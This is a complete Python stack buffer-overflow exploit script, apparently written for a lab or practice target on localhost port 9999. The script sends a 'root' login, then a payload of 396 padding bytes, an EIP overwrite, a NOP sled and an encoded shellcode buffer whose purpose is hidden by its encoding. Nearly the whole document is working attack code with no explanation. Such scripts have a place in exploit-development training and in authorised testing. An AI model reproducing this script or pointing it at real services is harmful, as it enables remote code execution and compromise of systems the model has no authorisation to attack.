import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999

offset = 396
eip = b"\x00\xce\xff\xff"
nop = b"\x90" * 8

buf =  b""
buf += b"\xd9\xc6\xd9\x74\x24\xf4\xb8\xc5\xe4\x5c\x7b\x5e"
buf += b"\x2b\xc9\xb1\x12\x31\x46\x17\x03\x46\x17\x83\x2b"
buf += b"\x18\xbe\x8e\x82\x3a\xc8\x92\xb7\xff\x64\x3f\x35"
buf += b"\x89\x6a\x0f\x5f\x44\xec\xe3\xc6\xe6\xd2\xce\x78"
buf += b"\x4f\x54\x28\x10\x2f\xa6\xca\xe1\xa7\xa4\xca\xf0"
buf += b"\x6b\x20\x2b\x42\xf5\x62\xfd\xf1\x49\x81\x74\x14"
buf += b"\x60\x06\xd4\xbe\x15\x28\xaa\x56\x82\x19\x63\xc4"
buf += b"\x3b\xef\x98\x5a\xef\x66\xbf\xea\x04\xb4\xc0"

payload = (b"A" * offset + eip + nop + buf)

print("Exploit ... ")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))
s.recv(1024)
    
s.send(b'root\r\n')
s.recv(1024)
s.send(payload + b'\r\n')
s.send(b'QUIT\r\n')
s.close()

